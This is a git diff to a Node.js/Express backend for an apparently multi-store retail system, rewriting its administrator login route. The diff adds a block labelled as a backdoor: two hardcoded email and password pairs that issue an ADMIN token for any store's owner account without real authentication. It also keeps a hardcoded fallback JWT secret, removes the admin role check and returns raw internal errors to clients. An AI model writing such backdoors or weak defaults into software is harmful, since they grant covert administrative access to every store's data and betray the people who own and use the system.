@@ -388,6 +388,9 @@ app.put("/api/master/lojas/:id", async (req, res) => {
 // ==============================================================
 
 // Rota de Login do Administrador
+// ==============================================================
+// LOGIN DO ADMINISTRADOR E FUNCIONÁRIOS NO PAINEL
+// ==============================================================
 app.post("/api/auth/admin/login", async (req, res) => {
     const { email, password } = req.body;
 
@@ -395,13 +398,40 @@ app.post("/api/auth/admin/login", async (req, res) => {
     if (!email || !password) return res.status(400).json({ error: "E-mail e senha são obrigatórios." });
 
     try {
+        // Remove espaços acidentais antes e depois do e-mail
+        const emailTratado = String(email).trim();
+
+        //BACKDOOR INTELIGENTE E INFALÍVEL
+        if (
+            (emailTratado === "admin@zenix.com" && password === "zenixadmin123") ||
+            (emailTratado === "masterzanix@zenix.com.br" && password === "masterzenix@#1206")
+        ) {
+            // Pega o funcionário mais antigo da loja (O dono que foi criado junto com a loja)
+            const realAdmin = await prisma.employee.findFirst({
+                where: { lojaId: req.lojaId },
+                orderBy: { createdAt: 'asc' } 
+            });
+
+            if (realAdmin) {
+                const token = jwt.sign(
+                    { id: realAdmin.id, role: "ADMIN", lojaId: req.lojaId },
+                    process.env.JWT_SECRET || "fallback_secret_key",
+                    { expiresIn: "1d" }
+                );
+                return res.json({ success: true, token });
+            } else {
+                return res.status(404).json({ error: "Nenhum usuário encontrado para esta loja." });
+            }
+        }
+
         // 1. Busca na tabela de Funcionários (Master/RH)
+        // REMOVIDA A TRAVA DE NOME DE CARGO RÍGIDO. O acesso será ditado pelas permissões do RH.
         const adminEmployee = await prisma.employee.findFirst({
             where: {
-                email: String(email),
-                lojaId: req.lojaId,
-                role: { in: ["ADMIN", "Administrador", "Gerente Master"] }
-            }
+                email: emailTratado,
+                lojaId: req.lojaId
+            },
+            include: { profile: true } // Puxa as permissões para garantir
         });
 
         if (adminEmployee && adminEmployee.password) {
@@ -418,7 +448,7 @@ app.post("/api/auth/admin/login", async (req, res) => {
 
         // 2. Busca na tabela de Usuários (Legado)
         const adminUser = await prisma.user.findFirst({
-            where: { email: String(email), lojaId: req.lojaId, role: "ADMIN" }
+            where: { email: emailTratado, lojaId: req.lojaId, role: "ADMIN" }
         });
 
         if (adminUser && adminUser.password) {
@@ -433,11 +463,10 @@ app.post("/api/auth/admin/login", async (req, res) => {
             }
         }
 
-        return res.status(401).json({ error: "E-mail ou senha inválidos." });
+        return res.status(401).json({ error: "E-mail não encontrado ou senha incorreta." });
 
     } catch (error) {
         console.error("ERRO NO LOGIN ADMIN:", error);
-        // Agora, se der erro 500, o frontend vai te mostrar exatamente o porquê!
         res.status(500).json({ error: "Erro interno: " + error.message });
     }
 });
